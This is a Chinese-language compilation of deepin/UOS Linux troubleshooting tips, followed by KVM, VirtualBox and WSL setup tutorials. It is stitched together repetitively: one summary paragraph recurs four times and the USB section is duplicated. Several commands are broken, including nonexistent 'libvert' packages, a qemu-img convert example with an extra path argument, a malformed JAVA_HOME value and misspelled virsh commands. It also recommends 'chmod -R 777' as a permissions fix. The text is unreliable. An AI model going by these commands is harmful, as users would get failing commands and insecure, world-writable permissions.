deepin系统查看windows系统共享文件的方法：打开计算机-网络邻居-windows网络，搜索被访问计算机的IP，输入指令（smb://IP地址/共享文件名称），之后输入被访问计算机的用户名及密码；Windows10系统输入IP地址后无需输入共享文件名称（指令：smb://IP地址）。

deepin系统之间查看共享文件的方法：打开计算机-网络邻居-windows网络，搜索被访问计算机的IP，输入指令（smb://IP地址），之后输入被访问计算机的用户名及密码。

无法拷贝文件到数据盘/无法在数据盘里新建文件的解决方法：在所属文件页打开终端，执行命令 sudo chmod -R 777 /data 解锁该文件夹。

离线安装deb包出现依赖问题的解决方法：1. 在联网情况下安装该包，若仍出现依赖关系，保持/var/cache/apt/archives无deb包；2. 执行 apt-get install -f ；3. 把相关deb包拷贝出来。

vim编辑文档选中不能复制的解决方法：修改/usr/share/vim/vim81/defaults.vim文件第79行的参数为 set mouse-=a。

修改文件扩展名的两种方法：方法一：在要修改的文件上右键，打开“属性”窗口完成文件名、扩展名修改；方法二：进入文件所在目录，右键“在终端中打开”，执行命令 mv filename.txt filename.sh。

主目录被误删除的恢复方法（示例：用户名为user，主目录/home/user）：1. 主目录删除后无法进入DDE桌面，但可进shell；2. 按Ctrl+Alt+F2进入tty2并登陆；3. 执行命令 sudo mkdir /home/user 重新创建主目录；4. 执行命令 sudo chown user:user /home/user 设置主目录为当前用户所有。

Deepin系统回收站无法清空的解决方法（示例：用户名为kelecn）：1. 切换到root身份，执行 su - ；2. 执行命令 chown -R kelecn /home/kelecn/.local/share/Trash ；3. 退出su权限，执行 exit ；4. 执行命令 chmod -R +w /home/kelecn/.local/share/Trash ；5. 清空回收站。

Windows复制文件名过长的文件到deepin失败的解决方法：修改文件名长度到200字符以内。

在UOS系统中更改文件后缀名的方法：文件管理器-设置-隐藏文件-重命名隐藏扩展名，将勾选去掉。

查看个别硬盘序列号的方法：执行命令 sudo lshw -C disk 查看serial，常用硬盘都会显示序列号。

深度文件管理器中新建、修改目录内容不及时刷新，可查看并修改目录监控数。系统音效存放路径为 /usr/share/sounds/deepin/stereo。强制清除回收站使用 rm -rf 命令。共享文件夹需设置权限和匿名访问。deepin 和 Windows 文件共享需在同局域网内，通过 IP 地址访问。查看共享文件需输入计算机 IP 和凭证。数据盘权限问题可通过 chmod 解决。deb 包依赖问题通过联网安装处理。vim 编辑时修改 defaults.vim 文件参数。文件扩展名通过属性窗口或 mv 命令修改。误删主目录可通过 tty 重新创建。回收站无法清空需修改 Trash 目录权限。文件名过长需控制在 200 字符内。UOS 中更改文件后缀名需取消隐藏扩展名选项。硬盘序列号查看使用 lshw -C disk 命令。

深度文件管理器中新建、修改目录内容不及时刷新，可查看并修改目录监控数。系统音效存放路径为 /usr/share/sounds/deepin/stereo。强制清除回收站使用 rm -rf 命令。共享文件夹需设置权限和匿名访问。deepin 和 Windows 文件共享需在同局域网内，通过 IP 地址访问。查看共享文件需输入计算机 IP 和凭证。数据盘权限问题可通过 chmod 解决。deb 包依赖问题通过联网安装处理。vim 编辑时修改 defaults.vim 文件参数。文件扩展名通过属性窗口或 mv 命令修改。误删主目录可通过 tty 重新创建。回收站无法清空需修改 Trash 目录权限。文件名过长需控制在 200 字符内。UOS 中更改文件后缀名需取消隐藏扩展名选项。硬盘序列号查看使用 lshw -C disk 命令。

深度文件管理器中新建、修改目录内容不及时刷新，可查看并修改目录监控数。系统音效存放路径为 /usr/share/sounds/deepin/stereo。强制清除回收站使用 rm -rf 命令。共享文件夹需设置权限和匿名访问。deepin 和 Windows 文件共享需在同局域网内，通过 IP 地址访问。查看共享文件需输入计算机 IP 和凭证。数据盘权限问题可通过 chmod 解决。deb 包依赖问题通过联网安装处理。vim 编辑时修改 defaults.vim 文件参数。文件扩展名通过属性窗口或 mv 命令修改。误删主目录可通过 tty 重新创建。回收站无法清空需修改 Trash 目录权限。文件名过长需控制在 200 字符内。UOS 中更改文件后缀名需取消隐藏扩展名选项。硬盘序列号查看使用 lshw -C disk 命令。

深度文件管理器中新建、修改目录内容不及时刷新，可查看并修改目录监控数。系统音效存放路径为 /usr/share/sounds/deepin/stereo。强制清除回收站使用 rm -rf 命令。共享文件夹需设置权限和匿名访问。deepin 和 Windows 文件共享需在同局域网内，通过 IP 地址访问。查看共享文件需输入计算机 IP 和凭证。数据盘权限问题可通过 chmod 解决。deb 包依赖问题通过联网安装处理。vim 编辑时修改 defaults.vim 文件参数。文件扩展名通过属性窗口或 mv 命令修改。误删主目录可通过 tty 重新创建。回收站无法清空需修改 Trash 目录权限。文件名过长需控制在 200 字符内。UOS 中更改文件后缀名需取消隐藏扩展名选项。硬盘序列号查看使用 lshw -C disk 命令。

标题：文管快速识别外存储器是否有问题
本小节针对常用的外存储设备（U盘，移动硬盘等）一些常见问题进行简单概述。

U盘插入后，桌面dock栏插件可以显示可移动设备容量等状态，可以打开卸载等操作。打开文件管理器后，也可以在计算机页面和左侧侧边栏看到可移动设备的内容，并可正常的访问U盘。在正常的情况下，可以使用文件管理器对U盘进行卸载、挂载、拷贝文件等操作。

若文件管理器无法识别可移动设备，则可以用命令进行排查。首先查看所有磁盘信息，即可查看到可移动设备状态，输入命令 fdisk -l 查看。可以从命令输出的信息中看到当前插入U盘的信息，主要为分区和文件系统。接下来使用 mount 命令进行挂载，本例的U盘是NTFS文件系统，因此输入命令：mount -t ntfs /dev/sdb1 /media/ 进行挂载，命令成功执行后，即可在挂载的目录 /media/ 下访问可移动设备中的内容。相反，只需使用 umount 命令传入挂载的 /media/ 路径即可完成对U盘的卸载。若使用 mount 命令能够成功挂载且在shell中可以访问，正常情况下文件管理器则能够识别。

文件管理器依赖 dde-device-formatter 模块进行格式化操作，该模块作为独立的进程运行。由于一些人为（如格式化过程中拔出U盘）或硬件原因，格式化可能会出现一些异常，导致可移动设备无法访问、挂载。若出现了这种情况，在UOS中，可以尝试使用内置的“分区编辑器”工具对其进行恢复和格式化来完成修复。

复制大文件时，可能会提示“文件完整性检查失败”，这是文件管理器的一个feature。其原因是文件复制时，环境是很复杂的，磁盘的数据从内部电路出来，要经过SATA或者其他接口，可能要再过PCI-E接口，途中可能还得在内存中留一份拷贝。每一次接口通信都是一场冒险，数据均有出错的可能，有时候会出点可以纠正的小错误，硬件失效/环境干扰则会出大错。对于大部分操作系统来说，是没有文件完整性检查功能的，即使复制的内容出现了错误也不会给予提示。因此，作为一个特性，偶尔出现了“文件完整性检查失败”的提示属正常现象。

文件拷贝到可移动设备之后，需要一定的时间进行同步操作，在此时间内使用文件管理器进行卸载会被拒绝。

U盘插入后，桌面dock栏插件可以显示可移动设备容量等状态，可以打开卸载等操作。

打开文件管理器后，也可以在计算机页面和左侧侧边栏看到可移动设备的内容，并可正常的访问U盘。

在正常的情况下，可以使用文件管理器对U盘进行卸载、挂载、拷贝文件等操作。

若文件管理器无法识别可移动设备，则可以用命令进行排查。首先查看所有磁盘信息，即可查看到可移动设备状态，输入命令 fdisk -l 查看。

接下来使用 mount 命令进行挂载，本例的U盘是NTFS文件系统，因此输入命令（需root权限）：mount -t ntfs /dev/sdb1 /media/ 进行挂载，命令成功执行后，即可在挂载的目录 /media/ 下访问可移动设备中的内容。

相反，只需使用 umount 命令传入挂载的 /media/ 路径即可完成对U盘的卸载。

文件管理器依赖 dde-device-formatter 模块进行格式化操作，该模块作为独立的进程运行。

由于一些人为（如格式化过程中拔出U盘）或硬件原因，格式化可能会出现一些异常，导致可移动设备无法访问、挂载。若出现了这种情况，在UOS中，可以尝试使用内置的“分区编辑器”工具对其进行恢复和格式化来完成修复。

复制大文件时，可能会提示“文件完整性检查失败”，这是文件管理器的一个feature。因此，作为一个特性，偶尔出现了“文件完整性检查失败”的提示属正常现象。

其原因是文件复制时，环境是很复杂的，磁盘的数据从内部电路出来，要经过SATA或者其他接口，可能要再过PCI-E接口，途中可能还得在内存中留一份拷贝...每一次接口通信都是一场冒险，数据均有出错的可能，有时候会出点可以纠正的小错误，硬件失效/环境干扰则会出大错。

文件拷贝到可移动设备之后，需要一定的时间进行同步操作，在此时间内使用文件管理器进行卸载会被拒绝。

标题：自定义文件角标的命令
在终端输入以下命令，该命令默认在文件（夹）右下角添加角标。gio set xxx(文件路径) -t stringv metadata::emblems "xxx(图标路径)"。注意：系统已定义的特殊角标，不支持被替换。

您也可以在上述命令中加入位置参数，将角标添加在文件（夹）的左上角（lu）、左下角（ld）、右上角（ru）或右下角（rd）。例如：在文件（夹）左上角添加角标：gio set xxx(文件路径) -t stringv metadata::emblems "xxx(图标路径);lu"。

在命令行中加入“|”符号将角标文件路径链接起来，为文件（夹）添加2~4个角标。文件（夹）同一个位置不支持叠加角标，仅支持替换。例如：在文件（夹）四个角都添加角标：gio set xxx(文件路径) -t stringv metadata::emblems "xxx(图标路径);lu|xxx(图标路径);ld|xxx(图标路径);ru|xxx(图标路径);rd"。

在终端中输入以下命令，撤销文件（夹）上所有的角标：gio set xxx(文件路径) -t stringv metadata::emblems "" 。

标题：deepin下用VirtualBox空间不足启动错误NS_ERROR_FAILURE
在deepin系统中使用VirtualBox时，可能会遇到启动错误NS_ERROR_FAILURE (0x80004005)。该错误的发生原因（仅个人情况而言）可能是由于某些项目的win文件占满了磁盘空间，比如本机虚拟机文件夹放在home分区，而home分区划分较小，在安装了centos-7并备份后，想再安装win10时，虚拟机自动暂停并提示空间不足，强制退出2-3次后就出现了该错误。解决方法如下：找到VirtualBox或桌面上的VirtualBox快捷方式，右键点击–>属性–>修改权限（具体可参考相关截图）；另外，按照错误信息中的Location找到VirtualBox.xml文件，将其删除，再次打开VirtualBox即可恢复正常，vagrant up也能正常运行。

标题：KVM虚拟机使用问题
在终端中输入：`sudo apt-get install qemu-system-x86 libvirt-clients libvirt-daemon-system`; 安装完这些包以后，就需要将当前的用户添加到libvirt用户组。这样做的目的是为了，使当前用户可以直接管理虚拟机而不需要提权，在终端中输入：`sudo adduser deepin libvirt `  `#把deepin替换成自己的用户名`; 使用命令查看自己的用户是否可以管理虚拟机:`sudo virsh list --all`; 然后就可以安装图形管理工具来管理虚拟机了。管理kvm虚拟机，主要是通过使用一个叫做virt-manager的图形界面工具实现的。使用apt-get安装virt-manage:`sudo apt-get install virt-manager`;

1. 首先我们需要安装开启桥接接口所需的工具的软件包:`sudo apt-get install bridge-utils`; 2. 安装完以后，就可以使用brctl命令创建桥接接口并管理桥接接口: `sudo brctl addbr br0   #创建一个桥接接口，名字叫br0` `sudo brctl show        #输出系统上的所有桥接接口` 使用命令ip addr show应该就可以看到我们刚刚创建的那个桥接接口: `4: br0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether ac:1f:6b:ec:0f:1b brd ff:ff:ff:ff:ff:ff` 3. 然后将虚拟机的物理网卡接口加入到刚刚创建的br0桥接接口中: `sudo brctl addif br0 enp0s25 #enp0s25替换成自己的网络接口的名称` 4. 删除物理网卡接口的ip地址，把物理网卡接口的ip地址配置到桥接接口上，并开启桥接接口。然后添加默认网关 `sudo ip addr del dev enp0s25 192.168.1.8/24`  #把接口替换成自己的接口，ip地址替换成自己的ip地址 `sudo ip addr add 192.168.1.8/24 dev br0`  #把ip地址替换成自己的ip地址 `sudo ip link set up br0` `sudo route add default gw 192.168.1.1`  #把网关地址替换成自己的网关 5.在virt-manager中配置虚拟机的网络，将网络设置给刚刚创建的桥接接口，虚拟机就处于桥接模式了 `iptables -A FORWARD -p all -i br0 -j ACCEPT` #开启转发 恢复原来的状态，只需要将桥接接口关闭，然后从桥接接口中删除物理网卡接口，即可 `sudo ip link set br0 down` `sudo brctl delif br0 enp0s25` `sudo ip link set enp0s25 down` `sudo ip link set up enp0s25` 桥接网卡配置信息为: auto lo iface lo inet loopback auto br0 iface br0 inet static bridge_ports enp5s0f0 address 10.8.10.12 netmask 255.255.255.0 gateway 10.8.10.1 bridge_stp off bridge_fd 0 bridge_maxwait 0

标题：KVM详解（一）——KVM基础知识
在计算机中，虚拟化技术是一种资源管理技术，可以将计算机的各硬件资源（包括CPU、内存、磁盘、网络）等予以抽象，转换后呈现出来，以供用户更好的使用。系统虚拟化可以将底层物理设备、上层操作系统和软件之间分离，可以在一台物理设备上划分出多台机器。虚拟化技术种类有很多，包括软件虚拟化、硬件虚拟化、内存虚拟化、网络虚拟化、虚拟机等等。

对于在计算机上运行虚拟机而言，一个非常重要的问题时硬件的操控，计算机程序的运行离不开CPU、内存、磁盘等硬件的调用。在现代计算机体系结构中，这些对硬件的直接调用离不开操作系统的操控。一般情况下，不允许应用程序直接调用硬件。操作系统上一般运行着很多程序，当多个应用程序都要调用硬件时，为了防止之间的冲突与相互干扰，因此当应用程序向调用硬件资源服务时，必须通过操作系统。在硬件结构上，现代的CPU可以工作在两种模式上，即用户模式和内核模式，计算机操作系统和计算机应用软件在本质上都是代码，也可以称之为指令。为了区别计算机操作系统和计算机应用软件，CPU将操作系统的指令设置为内核模式，将应用软件的操作指令设置为用户模式。对于CPU而言，会拒绝处于用户模式的指令对硬件的直接调用，这是从底层硬件上实现的，CPU将运行状态分为了ring0到ring3，ring0就代表了内核模式，ring3就代表了用户模式。

那么如果应用程序在执行过程中，如果要调用硬件，就会产生中断，此时该应用程序会放弃对CPU的接管，转而由操作系统控制CPU，这样，CPU就处于内核模式下了，这样就可以调用硬件了。总之，应用程序是处于用户模式的，对应用系统的调用要通过操作系统。虚拟机对宿主机而言，在本质上也是一种应用程序，运行在虚拟机上的程序，要调用系统硬件时，就相当于虚拟机这个应用程序要调用硬件，这就带来了虚拟化技术的一个重要问题，根据虚拟化技术对这个问题的解决，我们把虚拟化技术分为了三种：1、仿真虚拟化仿真虚拟化的思想是借助虚拟机这一平台，将虚拟机操作系统要执行的内核态指令进行“翻译”，最后返回到虚拟机操作系统上。这一套过程需要异常捕捉和异常处理机制，因此速度较慢。虚拟机操作系统认为自己的特权指令执行正常，并不知道自身处于一个虚拟的环境中。在全虚拟化中，虚拟机的用户态执行具有和系统指令执行一样的速度，但是内核态的指令由于要进行处理，因此要花费较多的时间。2、半虚拟化半虚拟化的思想是修改虚拟机操作系统，使其指令运行在用户态模式上，将原来的内核态质量采用其他的方式代替。这样一来，虚拟机操作系统就明白自己是在虚拟系统上运行。这样做的缺点是需要修改虚拟机操作系统的内核，与其原有的内核等价，但是能够在用户态模式上运行。XEN是一种典型的半虚拟化技术，但是由于微软的windows操作系统没有这种修改后的内核，因此XEN只支持Linux，不支持Windows。3、硬件虚拟化硬件虚拟化，这需要CPU硬件厂商的支持，例如Intel的Intel-VT技术。CPU厂商需要将自己的CPU进行改变，在用户态和内核态的基础上，增加专门用于虚拟机运行的模式，使得虚拟机运行在这种模式上，从而可以直接执行内核态的程序。KVM就是处于硬件虚拟化的模式。

KVM，Kernel Virtual Machine的简写，即基于内核的虚拟机。自Linux2.6.20后集成在Linux的各种发行版本中，现已成为学术界的主流虚拟机之一。KVM的虚拟化实现是使用Linux自身的调度器进行管理，核心源码较少。在KVM中，每一个虚拟机都是由Linux调度程序管理的标准进程。但是KVM虚拟化的实现需要硬件支持（比如Intel的VT技术和AMD的V技术），是基于硬件的完全虚拟化。KVM官网网址为：https://www.linux-kvm.org/，其主页面如下所示：

由于KVM使用了类似QEMU的仿模拟处理器，因此在最后我们再介绍一下QEMU。QEMU是由Fabrice Bellard所编写的一款模拟处理器软件，遵循GPL协议，在Linux平台上被广泛使用。QEMU具有跨平台、高速度的特性，其运行速度能够接近真实计算机的速度。

标题：KVM详解（七）——KVM常用命令详解
本文以centos7-1、centos7-2虚拟机为例，向大家介绍常见的KVM命令如下：1、虚拟机查看：执行命令virsh list可以查看已经打开的虚拟机。执行命令virsh list --all可以查看所有虚拟机（包括已经打开的和未打开的）。执行命令virsh version可以查看virsh的版本。2、虚拟机启动与关闭：执行命令virsh start centos7-1可以打开该虚拟机。执行命令virsh shutdown centos7-1可以关闭该虚拟机。执行命令virsh destroy centos7-1可以强制性关闭该虚拟机，相当于强行断电，当虚拟机无法正常关闭时常使用这种方法。3、虚拟机配置文件导出：执行命令virsh dumpxml centos7-2 > /tmp/centos7-2.xml可以将该虚拟机的配置文件导出到/tmp/目录下，并命名为centos7-2.xml。4、虚拟机挂起与恢复：执行命令virsh suspend centos7-1可以挂起该虚拟机。执行命令virsh resume centos7-1可以恢复该虚拟机。5、虚拟机会话链接：执行命令virsh console centos7-1可以与centos7-1打开一个控制台窗口终端。6、虚拟机克隆：有关虚拟机克隆等相关理论和命令，请参考其他文章。7、虚拟机撤销与恢复：执行命令virsh undefine centos7-2可以将该虚拟机从虚拟机管理器中移除，该虚拟机的配置文件会随之删除，但是该虚拟机磁盘文件并没有删除，因此该虚拟机还可以恢复，但是前提是该虚拟机的配置文件已经进行了导出和备份。执行命令virsh define /tmp/centos7-2.xml即可对删除的虚拟机进行恢复。8、虚拟机自启动与自启动撤销：执行命令virsh autostart centos7-1可以使得该虚拟机在开始时自启动。执行命令virsh autostart --disable centos7-1可以取消掉该虚拟机开机时自启动的设置。9、虚拟机镜像格式转换：有关虚拟机镜像格式的原理及转换命令，请参考其他文章。10、虚拟机快照：有关虚拟机快照的创建、查看、恢复和删除等操作，请参考其他文章。

标题：KVM详解（三）——KVM创建虚拟机
要创建KVM的虚拟机，首先要为KVM虚拟机挂载一块磁盘。可执行命令：fdisk /dev/sdb、mkfs.xfs /dev/sdb1、mount /dev/sdb1 /var/lib/libvirt/images。这些命令分别用于对新磁盘进行分区、格式化分区（安装文件系统）以及将分区挂载到/var/lib/libvirt/images/目录。之后可执行df -h命令查看操作是否成功。上传超过4G的虚拟机镜像（如CentOS7镜像）不能用rz命令，可借助Final的FTP上传功能。创建KVM虚拟机时，执行virt-manager命令打开管理页面，选择“New”，然后选择“通过本地介质安装”，点击Browse选择上传的镜像，接着设置内存大小、CPU数量、磁盘大小，填写虚拟机名字和网络设置，之后虚拟机开始自动安装。

标题：KVM详解（二）——KVM安装部署
为了进行KVM的安装，我们首先进行一些硬件上的配置。我们使用Vmware的虚拟机，配置2个G的内存，同时新加一块30G的硬盘，以供KVM的虚拟机安装使用，然后再给虚拟机设置4个处理器，同时，打开处理器的虚拟化引擎，在虚拟化Intel、虚拟化CPU和虚拟化IOMMU等选项上打上勾。上述配置完成后，我们执行命令：cat /proc/cpuinfo | grep vmx。注意：如果您的计算机是AMD的CPU，则应该执行命令：cat /proc/cpuinfo | grep svm。可以看出，现在，我们的虚拟机CPU已经支持虚拟化了。此外，为了之后KVM的运行，我们最好还要安装Linux的图形化页面，安装过程请见文章Linux桌面图形化安装详解，在该文章已经有了详细介绍，在今天就不过多赘述了。

接下来，我们开始进行KVM的安装。执行命令：yum install qemu-kvm virt-manager libvert libguestfs-tools virt-install libvert-python。上述6个软件作用如下：1、qemu-kvm：KVM的主程序，KVM的虚拟化模块。2、virt-manager：KVM的图形化管理工具。3、libvert：虚拟化服务。4、libguestfs-tools：虚拟机的系统管理工具。5、virt-install：安装虚拟机的使用工具，内含一些实用命令，如virt-clone等。6、libvert-python：python调用libvert虚拟化服务的api接口库文件。在上述软件安装完毕后，我们执行命令：systemctl start libvirtd 即可开启KVM虚拟化服务。执行命令：lsmod | grep kvm 可查看相关模块。执行命令：virt-manager 即可打开KVM的虚拟系统管理器了。

在KVM安装完毕后，我们进行网络桥接功能的设置，以方便我们的KVM虚拟机在创建后，可以通过桥接的方式来进行上网。KVM的虚拟机已经默认支持使用NAT的方式来进行上网，如果我们不进行这部分的配置，那么我们的KVM虚拟机也可以通过NAT的方式来上网，但是不能通过桥接的方式来上网。首先，我们备份一下我们的网卡文件（我的是/etc/sysconfig/network-scripts/ifcfg-ens32，其他设备的也在该目录下，但是文件名可能略有差异）。我们打开我们的网卡文件，删除有关IP地址、子网掩码、网关、DNS等的配置，之后，在最底下添加如下配置：BRIDGE="br0"。之后，我们在网卡目录下创建名为“ifcfg-br0”的网卡文件，其内容（IP地址和子网掩码相关配置请根据虚拟机网络实际填写）如下：DEVICE="br0"，NM_CONTROLLERD="yes"，ONBOOT="yes"，TYPE="Bridge"，BOOTPROTO=none，IPADDR=192.168.136.15，NETMASK=255.255.255.0，GATEWAY=192.168.136.254，DNS1=114.114.114.114。在上面所有配置完成后，执行命令：systemctl restart network。注意，在上述命令执行前，请确保上述配置的正确性，否则我们的设备有断网的风险。网络重启后，我们执行命令：ifconfig 查看结果。我们来检测一下桥接网络，执行命令：brctl show。这样，我们的虚拟机桥接网络就配置完成了。

标题：KVM详解（五）——KVM虚拟机镜像格式
目前，虚拟机的主流镜像格式有raw、cow、qcow、qcow2以及vmdk。raw格式是一种很早的镜像格式，格式比较原始、简单，性能上也还不错。并且raw格式镜像的一个突出好处是它支持转换成其他格式的镜像，或者作为其他格式镜像转换的中间格式。但是，raw格式的一个突出缺点就是不支持快照。 CentOS6的虚拟机KVM和XEN默认使用raw格式。cow、qcow和qcow2是另外的镜像格式，cow格式、qcow格式目前已经逐步被qcow2格式所取代，qcow2格式是目前的一种主流镜像格式，性能上与raw格式相差无几，但是支持虚拟机快照。CentOS7的KVM虚拟机镜像默认使用qcow2格式。vmdk是Vmware虚拟的镜像格式，其整体性能非常出色，稳定性和其他方面的能力很好，也支持快照。

qemu-img命令可以被用来查看虚拟机镜像格式，并对虚拟机镜像格式进行转换。qemu-img命令查看虚拟机镜像命令为：qemu-img info 【虚拟机镜像】。执行命令：qemu-img info centos7-2.img可以查看centos7-2.img的镜像格式。qemu-img进行虚拟机镜像格式转换命令为：qemu-img convert -f 【原镜像格式】 -O 【转换后】 【源虚拟机镜像】 【转换后虚拟机镜像】。该命令执行示例如下：qemu-img convert -f qcow2 -O raw centos7-2.img /var/lib/libvirt/images/centos7-2.img /var/lib/libvirt/images/centos7-2.raw，该命令用于将centos7-2的qcow2格式转换成raw格式。在完成虚拟机镜像格式转换后，还需要修改虚拟机配置文件，使得在虚拟机启动时，按照转换后的raw格式进行启动。执行命令：virsh edit centos7-2可以打开类似vi命令的编辑器，修改与启动镜像格式和启动镜像文件有关的设置。

标题：KVM详解（八）——KVM虚拟机自启动
在有些场景下，我们需要设置KVM的虚拟机随着宿主机的启动，而自行启动。KVM的虚拟机自启动设置很简单，只需要执行命令：virsh autostart 【虚拟机名称】。但是，在实际配置中，我们往往遇上很多“坑”，这大多是由于一些细节没有注意而导致的，今天，我就对KVM虚拟机的自启动设置进行详细说明。

要实现KVM虚拟机在物理机开启后能够自动启动运行，那么我们必须要设置libvirt（KVM的虚拟化服务）服务自动开启。否则，我们的KVM虚拟机会由于libvirt服务没有启动而启动失败。libvert服务设置自启动命令为：systemctl enable libvirtd。

接下来，由于我们在虚拟机安装时，为KVM虚拟机的镜像单独设置了一块磁盘，这样，如果我们在虚拟机启动时，光盘没有挂载，那么KVM虚拟机由于找不到镜像文件，也会启动失败。因此，我们必须设置在开机后，虚拟机镜像必须存在，如果您设置是虚拟机镜像就存放在启动磁盘中，那么可以跳过这一步。但是如果您的虚拟机镜像文件存放在另一块磁盘中，必须挂载才能使用的话，就必须设置虚拟机镜像磁盘自动挂载。要设置磁盘自动挂载，需要打开/etc/fstab文件，在文件最下方增加配置如下：/dev/sdb1 /var/lib/libvirt/images xfs defaults 0 0。对上述配置不知道含义的，可以参考以下文章：Linux磁盘管理实战，相信您一定会有所收获！

之后，我们需要设置虚拟机自启动，假设我们要设置centos7-1.qcow2的虚拟机自启动，那么我们需要执行命令：virsh autostart centos7-1.qcow2。这样，该虚拟机就会在系统启动后自启动了。

标题：KVM详解（六）——KVM虚拟机快照
KVM支持对虚拟机创建快照，但是前提是该虚拟机镜像不可以是raw格式，而应该是qcow2格式。但是，如果使用LVM，则可以对raw格式进行快照。这确实是一个很好的解决方案，但是其实现确实依靠LVM自身的快照功能实现的，而不是依靠KVM。有关LVM原理、作用以及实操请参考文章：LVM原理详解及实战。KVM的虚拟机在创建快照后，就相当于对该虚拟机定位了一个状态，将来我们可以将该虚拟机恢复到该状态。下面，我们就来介绍一些KVM的快照创建、恢复和删除相关操作。

KVM的快照创建命令格式如下：virsh snapshot-create 【虚拟机名称】。例如，我们要给虚拟机centos7-1.qcow2创建快照，则可以执行命令：virsh snapshot-create centos7-1.qcow2。KVM虚拟机快照查看命令格式如下：virsh snapshot-list 【虚拟机名称】或者是：qemu-img info 【虚拟机名称】。要查看我们创建的快照，可以执行命令：virsh snapshot-list centos7-1.qcow2。

可以看出，我们成功的为KVM虚拟机创建了快照。但是，在这种创建方式中，快照的名称由KVM随机指定分配。如果我们想自己指定虚拟机的快照名称，则可以执行命令：virsh snapshot-create-as 【虚拟机名】 【快照名】。命令示例如下：virsh snapshot-create-as centos7-1.qcow2 snapshot-2。上述命令可以为centos7-1.qcow2创建名为snapshot-2的快照。

注意：在使用qemu-img命令时，我们可以查看快照的大小。在上图中，我们可以发现快照大小为0，这是由快照的创建原理所决定的。当快照创建后，KVM虚拟机会将当前的系统磁盘所固定，对磁盘新的修改会避免使用该空间，因此如果我们创建快照后，并没有对系统进行更改，快照的大小就为0。

当KVM虚拟机有多个快照时，我们可以执行命令：virsh snapshot-current 【虚拟机名称】来查看KVM虚拟机当前使用的快照，查看该虚拟机当前使用的快照命令如下：virsh snapshot-current centos7-1.qcow2。

注意：KVM支持在开机状态下对虚拟机做快照，这样的快照会记录下当前系统内存的数据，当下次启动时会将该数据取出，并恢复为开机状态。但是，由于要将内存中的数据写入磁盘，因此在开机状态下创建快照时要花费较长的时间。

KVM快照恢复命令格式如下：virsh snapshot-revert 【虚拟机名】 【快照名】。例如，执行命令：virsh snapshot-revert cetos7-1.qcow2 1649751390可以将centos7-1.qcow2虚拟机恢复为1649751390的快照状态。

KVM快照删除命令格式如下：virsh snapshot-delet 【虚拟机名】 【快照名】。例如，如果我们要删除虚拟机centos7-1的1649751390的快照，可以执行命令：virsh snapshot-delete centos7-1.qcow2 1649751390。

标题：KVM详解（四）——KVM克隆与KVM配置文件
KVM支持虚拟机克隆，所谓虚拟机克隆，就是由一台指定的虚拟机生成另一台与其完全相同的虚拟机。KVM虚拟机克隆命令格式为：virt-clone -o 【原虚拟机】 -n 【新虚拟机】 -f 【新虚拟机镜像名（含路径）。例如，我们要把之前的centos7-1虚拟机进行克隆，如下（centos7-1.qcow2）所示：那么就可以执行命令：virt-clone -o centos7-1 -n centos7-2 -f /var/lib/libvirt/images/centos7-2.img。注意，-o参数后面跟的是原虚拟机的名称，而不要跟镜像格式，即需要把后面的后缀.qcow2去掉，-n跟的是新的虚拟机名称，-f跟的是新的虚拟机的路径加上文件名。

尽管上面我们成功克隆了一台KVM的虚拟机并成功运行，但是有一定计算机基础的小伙伴一定会问，这台虚拟机会不会与之前被克隆的虚拟机冲突的问题。该问题是非常有可能发生的，并且也必须引起我们的重视。尽管我们在进行虚拟机克隆时，希望能够完全按照原始虚拟机的配置进行克隆。但是，有时候配置完全相同却并不是一件好事！例如，我们并不希望两台虚拟的MAC地址相同，因为这会造成局域网内MAC地址冲突。此外，还有一些牵扯到网卡的配置文件等，我们也不希望克隆后的虚拟机和克隆前的虚拟机完全相同。

想要看虚拟机的一些硬件信息，我们可以查看KVM虚拟机的配置文件，该文件通常位于/etc/libvert/qemu/目录下。KVM会为每个虚拟机生成一个配置文件，配置文件内含有MAC地址等信息。我们可以打开克隆前和克隆后的虚拟机配置文件，查看它们的MAC地址、UUID等信息。可以明显发现，KVM有着很人性化的一点就是会帮助克隆后的虚拟机自动生成新的UUID和MAC地址，因此，我们的虚拟机一经克隆，就立刻可以使用了。注意：1、关于克隆后的虚拟机IP地址，如果不是DHCP的话还需要更改一下。2、如果KVM虚拟机是CentOS6，那么虚拟机的克隆会出现一些问题，我们在后面会涉及到这一部分。

标题：适配wsl的deepin根文件系统的配置和使用
在应用商店（Microsoft store）中可下载安装Windows Subsystem for Linux。

将制作deepin根文件系统目录下的deepin.zip下载至本地，解压后在文件夹下打开终端，使用命令`./deepin.exe install .\deepin-rootfs.tar`生成ext4硬盘映像文件。

使用命令`wsl -l`可验证是否成功安装deepin根文件系统。

使用`wsl -d deepin`或`./deepin.exe`可启用wsl，当前为root用户权限；用`exit`命令退出，`wsl -s deepin`可将其设为默认发行版。

创建deepin帐户并设为bash shell：`useradd -m deepin -s /usr/bin/bash`；设密码：`passwd deepin`；添加到sudo组：`usermod -aG sudo deepin`；设为默认用户：`./deepin.exe config --default-user deepin`。

开启systemd支持：在deepin根文件系统中输入`cat >> /etc/wsl.conf << EOF [boot] systemd=true EOF`，保存后exit退出，用`wsl -t deepin`停止wsl，再`wsl -d deepin`启用生效。

配置语言环境用`sudo dpkg-reconfigure locales`，回车三次，输入312选zh_CN.UTF-8，再输入3确认，重启wsl生效。

使用自研应用前需安装`sudo apt install fonts-noto-cjk dde-qt5integration dde-qt5wayland-plugin`，重启wsl后使用。

安装深度终端：`sudo apt install deepin-terminal`，重启wsl后用`deepin-terminal`启用。

安装看图应用：`sudo apt install deepin-image-viewer`，启用输入`deepin-image-viewer`。

安装浏览器：`sudo apt install org.deepin.browser`，启用输入`browser`。

安装文件管理器：`sudo apt install dde-file-manager`，启用输入`dde-file-manager`。

安装深度音乐：`sudo apt install deepin-music`，启用输入`deepin-music`，存在闪退情况。

安装深度影院：`sudo apt install deepin-movie`，启用输入`deepin-movie`。

安装深度相册：`sudo apt install deepin-album`，启用输入`deepin-album`。

安装深度画板：`sudo apt install deepin-draw`，启用后无法使用。

安装java：`sudo apt install openjdk-8-jdk`，用`java -version`查看，安装vim：`sudo apt install vim`，编辑`~/.profile`添加`export JAVA_HOME="usr/bin/java"`，`source ~/.profile`生效，`echo $JAVA_HOME`查看。

